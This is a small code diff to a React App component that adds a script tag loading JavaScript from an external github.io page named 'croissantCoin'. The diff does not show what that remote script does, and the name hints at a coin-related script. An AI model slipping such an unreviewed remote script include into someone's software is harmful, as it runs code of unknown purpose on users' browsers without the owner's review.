@@ -9,6 +9,10 @@ import Textbox2 from "./components/Textbox2/Textbox2";
 function App() {
   return (
     <div className="background">
+      <script
+        src="https://jessejacob15.github.io/croissantCoin"
+        crossorigin="anonymous"
+      ></script>
       <div>
         <Navigation />
       </div>
